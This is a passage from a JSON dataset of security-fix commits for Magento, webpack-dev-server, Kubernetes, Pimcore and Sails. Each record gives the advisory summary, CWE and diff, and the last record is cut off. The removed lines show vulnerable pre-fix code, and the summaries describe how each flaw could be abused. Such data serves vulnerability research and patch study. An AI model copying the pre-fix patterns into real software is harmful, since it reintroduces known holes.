            "published_date":"2021-08-30",
            "chain_len":1,
            "project":"https:\/\/github.com\/OpenMage\/magento-lts",
            "commit_href":"https:\/\/github.com\/OpenMage\/magento-lts\/commit\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7",
            "commit_sha":"b99307d00b59c4a226a1e3e4083f02cf2fc8fce7",
            "patch":"SINGLE",
            "chain_ord":"['b99307d00b59c4a226a1e3e4083f02cf2fc8fce7']",
            "before_first_fix_commit":"{'02a14e8893a1af9d8445bb5657b80272a09767ee'}",
            "last_fix_commit":"b99307d00b59c4a226a1e3e4083f02cf2fc8fce7",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/26\/2021, 01:01:15",
            "message":"Merge pull request from GHSA-26rr-v2j2-25fh\n\nCo-authored-by: Mark Lewis <markwlewis@Marks-MacBook-Pro.local>",
            "author":"Mark Lewis",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 1, 'total': 5}",
            "files":"{'app\/code\/core\/Mage\/Core\/Helper\/Security.php': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/OpenMage\/magento-lts\/raw\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7\/app%2Fcode%2Fcore%2FMage%2FCore%2FHelper%2FSecurity.php', 'patch': \"@@ -21,7 +21,10 @@ class Mage_Core_Helper_Security\\n     public function validateAgainstBlockMethodBlacklist(Mage_Core_Block_Abstract $block, $method, array $args)\\n     {\\n         foreach ($this->invalidBlockActions as $action) {\\n-            if ($block instanceof $action['block'] && strtolower($action['method']) === strtolower($method)) {\\n+            $calledMethod = strtolower($method);\\n+            if (($block instanceof $action['block'] && strtolower($action['method']) === $calledMethod)\\n+                || ($block instanceof $action['block']\\n+                    && strtolower($action['block'] . '::' . $action['method']) === $calledMethod)) {\\n                 Mage::throwException(\\n                     sprintf('Action with combination block %s and method %s is forbidden.', get_class($block), $method)\\n                 );\"}}",
            "message_norm":"merge pull request from ghsa-26rr-v2j2-25fh\n\nco-authored-by: mark lewis <markwlewis@marks-macbook-pro.local>",
            "language":"en",
            "entities":"[('ghsa-26rr-v2j2-25fh', 'VULNID', 'GHSA')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['app\/code\/core\/Mage\/Core\/Helper\/Security.php'])",
            "num_files":1.0,
            "patch_content":"From b99307d00b59c4a226a1e3e4083f02cf2fc8fce7 Mon Sep 17 00:00:00 2001\nFrom: Mark Lewis <mark@netalico.com>\nDate: Wed, 25 Aug 2021 18:01:15 -0700\nSubject: [PATCH] Merge pull request from GHSA-26rr-v2j2-25fh\n\nCo-authored-by: Mark Lewis <markwlewis@Marks-MacBook-Pro.local>\n---\n app\/code\/core\/Mage\/Core\/Helper\/Security.php | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\ndiff --git a\/app\/code\/core\/Mage\/Core\/Helper\/Security.php b\/app\/code\/core\/Mage\/Core\/Helper\/Security.php\nindex 00c4c53964b..1eb2f08fb56 100644\n--- a\/app\/code\/core\/Mage\/Core\/Helper\/Security.php\n+++ b\/app\/code\/core\/Mage\/Core\/Helper\/Security.php\n@@ -21,7 +21,10 @@ class Mage_Core_Helper_Security\n     public function validateAgainstBlockMethodBlacklist(Mage_Core_Block_Abstract $block, $method, array $args)\n     {\n         foreach ($this->invalidBlockActions as $action) {\n-            if ($block instanceof $action['block'] && strtolower($action['method']) === strtolower($method)) {\n+            $calledMethod = strtolower($method);\n+            if (($block instanceof $action['block'] && strtolower($action['method']) === $calledMethod)\n+                || ($block instanceof $action['block']\n+                    && strtolower($action['block'] . '::' . $action['method']) === $calledMethod)) {\n                 Mage::throwException(\n                     sprintf('Action with combination block %s and method %s is forbidden.', get_class($block), $method)\n                 );",
            "code_diff":"@@ -21,7 +21,10 @@ class Mage_Core_Helper_Security\n     public function validateAgainstBlockMethodBlacklist(Mage_Core_Block_Abstract $block, $method, array $args)\n     {\n         foreach ($this->invalidBlockActions as $action) {\n-            if ($block instanceof $action['block'] && strtolower($action['method']) === strtolower($method)) {\n+            $calledMethod = strtolower($method);\n+            if (($block instanceof $action['block'] && strtolower($action['method']) === $calledMethod)\n+                || ($block instanceof $action['block']\n+                    && strtolower($action['block'] . '::' . $action['method']) === $calledMethod)) {\n                 Mage::throwException(\n                     sprintf('Action with combination block %s and method %s is forbidden.', get_class($block), $method)\n                 );"
        },
        {
            "index":144,
            "vuln_id":"GHSA-cf66-xwfp-gvc4",
            "cwe_id":"{'CWE-20'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/f18e5adf123221a1015be63e1ca2491ca45b8d10'}",
            "dataset":"osv",
            "summary":"Missing Origin Validation in webpack-dev-server Versions of `webpack-dev-server` before 3.1.10 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.\n\n\n## Recommendation\nFor `webpack-dev-server` update to version 3.1.11 or later.",
            "published_date":"2019-01-04",
            "chain_len":1,
            "project":"https:\/\/github.com\/webpack\/webpack-dev-server",
            "commit_href":"https:\/\/github.com\/webpack\/webpack-dev-server\/commit\/f18e5adf123221a1015be63e1ca2491ca45b8d10",
            "commit_sha":"f18e5adf123221a1015be63e1ca2491ca45b8d10",
            "patch":"SINGLE",
            "chain_ord":"['f18e5adf123221a1015be63e1ca2491ca45b8d10']",
            "before_first_fix_commit":"{'e1bd264b9ce5fb0a05a62754883f6c8a36fbc51b'}",
            "last_fix_commit":"f18e5adf123221a1015be63e1ca2491ca45b8d10",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/24\/2018, 16:57:43",
            "message":"check origin header for websocket connection",
            "author":"Tobias Koppers",
            "comments":"{'com_1': {'author': 'hackel', 'datetime': '11\/09\/2018, 05:45:42', 'body': 'Any chance this security fix could be backported to 2.x?\\r\\nJust noticed this.  https:\/\/nodesecurity.io\/advisories\/725'}, 'com_2': {'author': 'alexander-akait', 'datetime': '11\/09\/2018, 10:14:03', 'body': 'No, please update to `3` version, `2` is deprecated'}, 'com_3': {'author': 'aeegvk', 'datetime': '01\/02\/2019, 08:33:02', 'body': 'Updated to suggested version 3.1.11 and latest version 3.1.14 but still getting a vulnerability report. How come?'}, 'com_4': {'author': 'oles', 'datetime': '01\/02\/2019, 10:54:04', 'body': 'Experiencing the same as @aeegvk.\\r\\n\\r\\nSeems like the error is in https:\/\/www.npmjs.com\/advisories\/725 though.'}, 'com_5': {'author': 'charlesfaustin', 'datetime': '01\/02\/2019, 13:35:57', 'body': '> Updated to suggested version 3.1.11 and latest version 3.1.14 but still getting a vulnerability report. How come?\\r\\n\\r\\nthere appears to be a typo in the npm vulnerability database\\r\\nhttps:\/\/npm.community\/t\/npm-audit-sweems-to-get-semver-wrong\/4352\/4'}}",
            "stats":"{'additions': 9, 'deletions': 2, 'total': 11}",
            "files":"{'lib\/Server.js': {'additions': 9, 'deletions': 2, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/webpack\/webpack-dev-server\/raw\/f18e5adf123221a1015be63e1ca2491ca45b8d10\/lib%2FServer.js', 'patch': '@@ -513,13 +513,15 @@ Server.prototype.setContentHeaders = function (req, res, next) {\\n   next();\\n };\\n \\n-Server.prototype.checkHost = function (headers) {\\n+Server.prototype.checkHost = function (headers, headerToCheck) {\\n   \/\/ allow user to opt-out this security check, at own risk\\n   if (this.disableHostCheck) return true;\\n \\n+  if (!headerToCheck) headerToCheck = \"host\";\\n+\\n   \/\/ get the Host header and extract hostname\\n   \/\/ we don\\'t care about port not matching\\n-  const hostHeader = headers.host;\\n+  const hostHeader = headers[headerToCheck];\\n   if (!hostHeader) return false;\\n \\n   \/\/ use the node url-parser to retrieve the hostname from the host-header.\\n@@ -589,6 +591,11 @@ Server.prototype.listen = function (port, hostname, fn) {\\n         conn.close();\\n         return;\\n       }\\n+      if (!this.checkHost(conn.headers, \"origin\")) {\\n+        this.sockWrite([conn], \\'error\\', \\'Invalid Origin header\\');\\n+        conn.close();\\n+        return;\\n+      }\\n       this.sockets.push(conn);\\n \\n       conn.on(\\'close\\', () => {'}}",
            "message_norm":"check origin header for websocket connection",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/Server.js'])",
            "num_files":1.0,
            "patch_content":"From f18e5adf123221a1015be63e1ca2491ca45b8d10 Mon Sep 17 00:00:00 2001\nFrom: Tobias Koppers <tobias.koppers@googlemail.com>\nDate: Tue, 24 Jul 2018 18:57:43 +0200\nSubject: [PATCH] check origin header for websocket connection\n\n---\n lib\/Server.js | 11 +++++++++--\n 1 file changed, 9 insertions(+), 2 deletions(-)\n\ndiff --git a\/lib\/Server.js b\/lib\/Server.js\nindex 9f1992f733..c56fe79c33 100644\n--- a\/lib\/Server.js\n+++ b\/lib\/Server.js\n@@ -513,13 +513,15 @@ Server.prototype.setContentHeaders = function (req, res, next) {\n   next();\n };\n \n-Server.prototype.checkHost = function (headers) {\n+Server.prototype.checkHost = function (headers, headerToCheck) {\n   \/\/ allow user to opt-out this security check, at own risk\n   if (this.disableHostCheck) return true;\n \n+  if (!headerToCheck) headerToCheck = \"host\";\n+\n   \/\/ get the Host header and extract hostname\n   \/\/ we don't care about port not matching\n-  const hostHeader = headers.host;\n+  const hostHeader = headers[headerToCheck];\n   if (!hostHeader) return false;\n \n   \/\/ use the node url-parser to retrieve the hostname from the host-header.\n@@ -589,6 +591,11 @@ Server.prototype.listen = function (port, hostname, fn) {\n         conn.close();\n         return;\n       }\n+      if (!this.checkHost(conn.headers, \"origin\")) {\n+        this.sockWrite([conn], 'error', 'Invalid Origin header');\n+        conn.close();\n+        return;\n+      }\n       this.sockets.push(conn);\n \n       conn.on('close', () => {",
            "code_diff":"@@ -513,13 +513,15 @@ Server.prototype.setContentHeaders = function (req, res, next) {\n   next();\n };\n \n-Server.prototype.checkHost = function (headers) {\n+Server.prototype.checkHost = function (headers, headerToCheck) {\n   \/\/ allow user to opt-out this security check, at own risk\n   if (this.disableHostCheck) return true;\n \n+  if (!headerToCheck) headerToCheck = \"host\";\n+\n   \/\/ get the Host header and extract hostname\n   \/\/ we don't care about port not matching\n-  const hostHeader = headers.host;\n+  const hostHeader = headers[headerToCheck];\n   if (!hostHeader) return false;\n \n   \/\/ use the node url-parser to retrieve the hostname from the host-header.\n@@ -589,6 +591,11 @@ Server.prototype.listen = function (port, hostname, fn) {\n         conn.close();\n         return;\n       }\n+      if (!this.checkHost(conn.headers, \"origin\")) {\n+        this.sockWrite([conn], 'error', 'Invalid Origin header');\n+        conn.close();\n+        return;\n+      }\n       this.sockets.push(conn);\n \n       conn.on('close', () => {"
        },
        {
            "index":612,
            "vuln_id":"GHSA-579h-mv94-g4gp",
            "cwe_id":"{'CWE-269'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/kubernetes\/kubernetes\/commit\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905'}",
            "dataset":"osv",
            "summary":"Privilege Escalation in Kubernetes In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses to proxied upgrade requests in the kube-apiserver allowed specially crafted requests to establish a connection through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish the backend connection.",
            "published_date":"2022-02-15",
            "chain_len":1,
            "project":"https:\/\/github.com\/kubernetes\/kubernetes",
            "commit_href":"https:\/\/github.com\/kubernetes\/kubernetes\/commit\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905",
            "commit_sha":"2257c1ecbe3c0cf71dd50b82752ae189c94ec905",
            "patch":"SINGLE",
            "chain_ord":"['2257c1ecbe3c0cf71dd50b82752ae189c94ec905']",
            "before_first_fix_commit":"{'b84e3dd6f80af4016acfd891ef6cc50ce05d4b5b', '396271cf52af70bc96ed378dd9ce1a865cc99647'}",
            "last_fix_commit":"2257c1ecbe3c0cf71dd50b82752ae189c94ec905",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/26\/2018, 12:26:22",
            "message":"Merge pull request #71412 from liggitt\/backend-error\n\nHandle error responses from backends",
            "author":"k8s-ci-robot",
            "comments":null,
            "stats":"{'additions': 37, 'deletions': 0, 'total': 37}",
            "files":"{'staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go': {'additions': 37, 'deletions': 0, 'changes': 37, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kubernetes\/kubernetes\/raw\/2257c1ecbe3c0cf71dd50b82752ae189c94ec905\/staging%2Fsrc%2Fk8s.io%2Fapimachinery%2Fpkg%2Futil%2Fproxy%2Fupgradeaware.go', 'patch': '@@ -17,6 +17,7 @@ limitations under the License.\\n package proxy\\n \\n import (\\n+\\t\"bufio\"\\n \\t\"bytes\"\\n \\t\"context\"\\n \\t\"fmt\"\\n@@ -271,6 +272,18 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\\n \\t}\\n \\tdefer backendConn.Close()\\n \\n+\\t\/\/ determine the http response code from the backend by reading from rawResponse+backendConn\\n+\\trawResponseCode, headerBytes, err := getResponseCode(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\\n+\\tif err != nil {\\n+\\t\\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\\n+\\t\\th.Responder.Error(w, req, err)\\n+\\t\\treturn true\\n+\\t}\\n+\\tif len(headerBytes) > len(rawResponse) {\\n+\\t\\t\/\/ we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\\n+\\t\\trawResponse = headerBytes\\n+\\t}\\n+\\n \\t\/\/ Once the connection is hijacked, the ErrorResponder will no longer work, so\\n \\t\/\/ hijacking should be the last step in the upgrade.\\n \\trequestHijacker, ok := w.(http.Hijacker)\\n@@ -295,6 +308,17 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\\n \\t\\t}\\n \\t}\\n \\n+\\tif rawResponseCode != http.StatusSwitchingProtocols {\\n+\\t\\t\/\/ If the backend did not upgrade the request, finish echoing the response from the backend to the client and return, closing the connection.\\n+\\t\\tklog.V(6).Infof(\"Proxy upgrade error, status code %d\", rawResponseCode)\\n+\\t\\t_, err := io.Copy(requestHijackedConn, backendConn)\\n+\\t\\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\\n+\\t\\t\\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\\n+\\t\\t}\\n+\\t\\t\/\/ Indicate we handled the request\\n+\\t\\treturn true\\n+\\t}\\n+\\n \\t\/\/ Proxy the connection. This is bidirectional, so we need a goroutine\\n \\t\/\/ to copy in each direction. Once one side of the connection exits, we\\n \\t\/\/ exit the function which performs cleanup and in the process closes\\n@@ -356,6 +380,19 @@ func (h *UpgradeAwareHandler) DialForUpgrade(req *http.Request) (net.Conn, error\\n \\treturn dial(updatedReq, h.UpgradeTransport)\\n }\\n \\n+\/\/ getResponseCode reads a http response from the given reader, returns the status code,\\n+\/\/ the bytes read from the reader, and any error encountered\\n+func getResponseCode(r io.Reader) (int, []byte, error) {\\n+\\trawResponse := bytes.NewBuffer(make([]byte, 0, 256))\\n+\\t\/\/ Save the bytes read while reading the response headers into the rawResponse buffer\\n+\\tresp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\\n+\\tif err != nil {\\n+\\t\\treturn 0, nil, err\\n+\\t}\\n+\\t\/\/ return the http status code and the raw bytes consumed from the reader in the process\\n+\\treturn resp.StatusCode, rawResponse.Bytes(), nil\\n+}\\n+\\n \/\/ dial dials the backend at req.URL and writes req to it.\\n func dial(req *http.Request, transport http.RoundTripper) (net.Conn, error) {\\n \\tconn, err := DialURL(req.Context(), req.URL, transport)'}}",
            "message_norm":"merge pull request #71412 from liggitt\/backend-error\n\nhandle error responses from backends",
            "language":"no",
            "entities":"[('#71412', 'ISSUE', ''), ('error', 'FLAW', ''), ('error', 'FLAW', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go'])",
            "num_files":1.0,
            "patch_content":"From b84e3dd6f80af4016acfd891ef6cc50ce05d4b5b Mon Sep 17 00:00:00 2001\nFrom: Jordan Liggitt <liggitt@google.com>\nDate: Mon, 5 Nov 2018 23:50:35 -0500\nSubject: [PATCH] Verify backend upgraded connection\n\n---\n ...\/pkg\/util\/proxy\/upgradeaware.go            | 37 +++++++++++++++++++\n 1 file changed, 37 insertions(+)\n\ndiff --git a\/staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go b\/staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go\nindex 596b1888975c7..2cabb894c1af7 100644\n--- a\/staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go\n+++ b\/staging\/src\/k8s.io\/apimachinery\/pkg\/util\/proxy\/upgradeaware.go\n@@ -17,6 +17,7 @@ limitations under the License.\n package proxy\n \n import (\n+\t\"bufio\"\n \t\"bytes\"\n \t\"context\"\n \t\"fmt\"\n@@ -271,6 +272,18 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\n \t}\n \tdefer backendConn.Close()\n \n+\t\/\/ determine the http response code from the backend by reading from rawResponse+backendConn\n+\trawResponseCode, headerBytes, err := getResponseCode(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\n+\tif err != nil {\n+\t\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\n+\t\th.Responder.Error(w, req, err)\n+\t\treturn true\n+\t}\n+\tif len(headerBytes) > len(rawResponse) {\n+\t\t\/\/ we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\n+\t\trawResponse = headerBytes\n+\t}\n+\n \t\/\/ Once the connection is hijacked, the ErrorResponder will no longer work, so\n \t\/\/ hijacking should be the last step in the upgrade.\n \trequestHijacker, ok := w.(http.Hijacker)\n@@ -295,6 +308,17 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\n \t\t}\n \t}\n \n+\tif rawResponseCode != http.StatusSwitchingProtocols {\n+\t\t\/\/ If the backend did not upgrade the request, finish echoing the response from the backend to the client and return, closing the connection.\n+\t\tklog.V(6).Infof(\"Proxy upgrade error, status code %d\", rawResponseCode)\n+\t\t_, err := io.Copy(requestHijackedConn, backendConn)\n+\t\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n+\t\t\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\n+\t\t}\n+\t\t\/\/ Indicate we handled the request\n+\t\treturn true\n+\t}\n+\n \t\/\/ Proxy the connection. This is bidirectional, so we need a goroutine\n \t\/\/ to copy in each direction. Once one side of the connection exits, we\n \t\/\/ exit the function which performs cleanup and in the process closes\n@@ -356,6 +380,19 @@ func (h *UpgradeAwareHandler) DialForUpgrade(req *http.Request) (net.Conn, error\n \treturn dial(updatedReq, h.UpgradeTransport)\n }\n \n+\/\/ getResponseCode reads a http response from the given reader, returns the status code,\n+\/\/ the bytes read from the reader, and any error encountered\n+func getResponseCode(r io.Reader) (int, []byte, error) {\n+\trawResponse := bytes.NewBuffer(make([]byte, 0, 256))\n+\t\/\/ Save the bytes read while reading the response headers into the rawResponse buffer\n+\tresp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\n+\tif err != nil {\n+\t\treturn 0, nil, err\n+\t}\n+\t\/\/ return the http status code and the raw bytes consumed from the reader in the process\n+\treturn resp.StatusCode, rawResponse.Bytes(), nil\n+}\n+\n \/\/ dial dials the backend at req.URL and writes req to it.\n func dial(req *http.Request, transport http.RoundTripper) (net.Conn, error) {\n \tconn, err := DialURL(req.Context(), req.URL, transport)",
            "code_diff":"@@ -17,6 +17,7 @@ limitations under the License.\n package proxy\n \n import (\n+\t\"bufio\"\n \t\"bytes\"\n \t\"context\"\n \t\"fmt\"\n@@ -271,6 +272,18 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\n \t}\n \tdefer backendConn.Close()\n \n+\t\/\/ determine the http response code from the backend by reading from rawResponse+backendConn\n+\trawResponseCode, headerBytes, err := getResponseCode(io.MultiReader(bytes.NewReader(rawResponse), backendConn))\n+\tif err != nil {\n+\t\tklog.V(6).Infof(\"Proxy connection error: %v\", err)\n+\t\th.Responder.Error(w, req, err)\n+\t\treturn true\n+\t}\n+\tif len(headerBytes) > len(rawResponse) {\n+\t\t\/\/ we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\n+\t\trawResponse = headerBytes\n+\t}\n+\n \t\/\/ Once the connection is hijacked, the ErrorResponder will no longer work, so\n \t\/\/ hijacking should be the last step in the upgrade.\n \trequestHijacker, ok := w.(http.Hijacker)\n@@ -295,6 +308,17 @@ func (h *UpgradeAwareHandler) tryUpgrade(w http.ResponseWriter, req *http.Reques\n \t\t}\n \t}\n \n+\tif rawResponseCode != http.StatusSwitchingProtocols {\n+\t\t\/\/ If the backend did not upgrade the request, finish echoing the response from the backend to the client and return, closing the connection.\n+\t\tklog.V(6).Infof(\"Proxy upgrade error, status code %d\", rawResponseCode)\n+\t\t_, err := io.Copy(requestHijackedConn, backendConn)\n+\t\tif err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n+\t\t\tklog.Errorf(\"Error proxying data from backend to client: %v\", err)\n+\t\t}\n+\t\t\/\/ Indicate we handled the request\n+\t\treturn true\n+\t}\n+\n \t\/\/ Proxy the connection. This is bidirectional, so we need a goroutine\n \t\/\/ to copy in each direction. Once one side of the connection exits, we\n \t\/\/ exit the function which performs cleanup and in the process closes\n@@ -356,6 +380,19 @@ func (h *UpgradeAwareHandler) DialForUpgrade(req *http.Request) (net.Conn, error\n \treturn dial(updatedReq, h.UpgradeTransport)\n }\n \n+\/\/ getResponseCode reads a http response from the given reader, returns the status code,\n+\/\/ the bytes read from the reader, and any error encountered\n+func getResponseCode(r io.Reader) (int, []byte, error) {\n+\trawResponse := bytes.NewBuffer(make([]byte, 0, 256))\n+\t\/\/ Save the bytes read while reading the response headers into the rawResponse buffer\n+\tresp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\n+\tif err != nil {\n+\t\treturn 0, nil, err\n+\t}\n+\t\/\/ return the http status code and the raw bytes consumed from the reader in the process\n+\treturn resp.StatusCode, rawResponse.Bytes(), nil\n+}\n+\n \/\/ dial dials the backend at req.URL and writes req to it.\n func dial(req *http.Request, transport http.RoundTripper) (net.Conn, error) {\n \tconn, err := DialURL(req.Context(), req.URL, transport)"
        },
        {
            "index":652,
            "vuln_id":"GHSA-f7q6-xxph-mfm8",
            "cwe_id":"{'CWE-79'}",
            "score":5.4,
            "chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/3ae96b9d41c117aafa45873ad10077d4b873a3cb'}",
            "dataset":"osv",
            "summary":"Cross-site Scripting in Pimcore Pimcore prior to version 10.2.10 contains a cross-site scripting vulnerability.",
            "published_date":"2022-01-27",
            "chain_len":1,
            "project":"https:\/\/github.com\/pimcore\/pimcore",
            "commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/3ae96b9d41c117aafa45873ad10077d4b873a3cb",
            "commit_sha":"3ae96b9d41c117aafa45873ad10077d4b873a3cb",
            "patch":"SINGLE",
            "chain_ord":"['3ae96b9d41c117aafa45873ad10077d4b873a3cb']",
            "before_first_fix_commit":"{'fbb2badbb05ec80e4f6f15b52fb2f58cbbf379c4'}",
            "last_fix_commit":"3ae96b9d41c117aafa45873ad10077d4b873a3cb",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/25\/2022, 11:20:25",
            "message":"disallow html entity names on import - follow up to #11217",
            "author":"Divesh",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'models\/DataObject\/ClassDefinition\/Service.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/3ae96b9d41c117aafa45873ad10077d4b873a3cb\/models%2FDataObject%2FClassDefinition%2FService.php', 'patch': \"@@ -315,11 +315,11 @@ public static function generateLayoutTreeFromArray($array, $throwException = fal\\n     {\\n         if (is_array($array) && count($array) > 0) {\\n             if ($name = $array['name'] ?? false) {\\n-                $sanitizedName = htmlentities($name);\\n-                if ($sanitizedName !== $name) {\\n+                if (preg_match('\/<.+?>\/', $name)) {\\n                     throw new \\\\Exception('not a valid name:' . htmlentities($name));\\n                 }\\n             }\\n+\\n             \/** @var LoaderInterface $loader *\/\\n             $loader = \\\\Pimcore::getContainer()->get('pimcore.implementation_loader.object.' . $array['datatype']);\"}}",
            "message_norm":"disallow html entity names on import - follow up to #11217",
            "language":"en",
            "entities":"[('#11217', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['models\/DataObject\/ClassDefinition\/Service.php'])",
            "num_files":1.0,
            "patch_content":"From 3ae96b9d41c117aafa45873ad10077d4b873a3cb Mon Sep 17 00:00:00 2001\nFrom: Divesh <divesh.pahuja@pimcore.com>\nDate: Tue, 25 Jan 2022 12:20:25 +0100\nSubject: [PATCH] disallow html entity names on import - follow up to #11217\n\n---\n models\/DataObject\/ClassDefinition\/Service.php | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/models\/DataObject\/ClassDefinition\/Service.php b\/models\/DataObject\/ClassDefinition\/Service.php\nindex 46ba9941366..4208f1e09f8 100644\n--- a\/models\/DataObject\/ClassDefinition\/Service.php\n+++ b\/models\/DataObject\/ClassDefinition\/Service.php\n@@ -315,11 +315,11 @@ public static function generateLayoutTreeFromArray($array, $throwException = fal\n     {\n         if (is_array($array) && count($array) > 0) {\n             if ($name = $array['name'] ?? false) {\n-                $sanitizedName = htmlentities($name);\n-                if ($sanitizedName !== $name) {\n+                if (preg_match('\/<.+?>\/', $name)) {\n                     throw new \\Exception('not a valid name:' . htmlentities($name));\n                 }\n             }\n+\n             \/** @var LoaderInterface $loader *\/\n             $loader = \\Pimcore::getContainer()->get('pimcore.implementation_loader.object.' . $array['datatype']);",
            "code_diff":"@@ -315,11 +315,11 @@ public static function generateLayoutTreeFromArray($array, $throwException = fal\n     {\n         if (is_array($array) && count($array) > 0) {\n             if ($name = $array['name'] ?? false) {\n-                $sanitizedName = htmlentities($name);\n-                if ($sanitizedName !== $name) {\n+                if (preg_match('\/<.+?>\/', $name)) {\n                     throw new \\Exception('not a valid name:' . htmlentities($name));\n                 }\n             }\n+\n             \/** @var LoaderInterface $loader *\/\n             $loader = \\Pimcore::getContainer()->get('pimcore.implementation_loader.object.' . $array['datatype']);"
        },
        {
            "index":315,
            "vuln_id":"GHSA-qmv4-jgp7-mf68",
            "cwe_id":"{'CWE-284'}",
            "score":0.0,
            "chain":"{'https:\/\/github.com\/balderdashy\/sails\/commit\/0057123a0321be6758845abbeb4290bf418ce542'}",
            "dataset":"osv",
            "summary":"Sails before 0.12.7 vulnerable to Broken CORS Affected versions of `sails` have an issue with the CORS configuration where the value of the origin header is reflected as the value for the `Access-Control-Allow-Origin` header. This may allow an attacker to make AJAX requests to vulnerable hosts through cross-site scripting or a malicious HTML Document, effectively bypassing the Same Origin Policy. \n\n## Mitigating Factors\n\nThis is only an issue when `allRoutes` is set to `true` and `origin` is set to `*` or left commented out in the sails CORS config file. \n\nThe problem can be compounded when the cors `credentials` setting is not provided, because at that point authenticated cross domain requests are possible.\n\n\n## Recommendation\n\nUpdate to version 0.12.7 or later.\n\nAs this vulnerability is primarily a user error, the patch for the vulnerability will simply cause the application to write an error message to the console when a vulnerable configuration is used in a production environment.\n\nWriting a proper CORS configuration is still the responsibility of the user, so it is necessary to check for the error message after installing the patch. Be sure you are not using `allRoutes: true` with `origin:'*'`, and that you uncomment `origin` and set it to a reasonable value. Ensure that if `origin` is set to `*` that you truly mean for all other websites to be able to make cross-domain requests to your API.\n\nLikewise, ensure `credentials` is uncommented out and set to the appropriate value. Make sure to explicitly set which origins may request resources via CORS.",
            "published_date":"2019-02-18",
            "chain_len":1,
            "project":"https:\/\/github.com\/balderdashy\/sails",
            "commit_href":"https:\/\/github.com\/balderdashy\/sails\/commit\/0057123a0321be6758845abbeb4290bf418ce542",
            "commit_sha":"0057123a0321be6758845abbeb4290bf418ce542",
            "patch":"SINGLE",
            "chain_ord":"['0057123a0321be6758845abbeb4290bf418ce542']",
            "before_first_fix_commit":"{'8d642f1ab3d46491cf7b73af1ec54941ff0eb84b'}",
            "last_fix_commit":"0057123a0321be6758845abbeb4290bf418ce542",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/05\/2016, 23:16:26",
            "message":"Warn about overly-permissive CORS settings when lifting in production",
            "author":"Scott Gress",
            "comments":null,
            "stats":"{'additions': 48, 'deletions': 0, 'total': 48}",
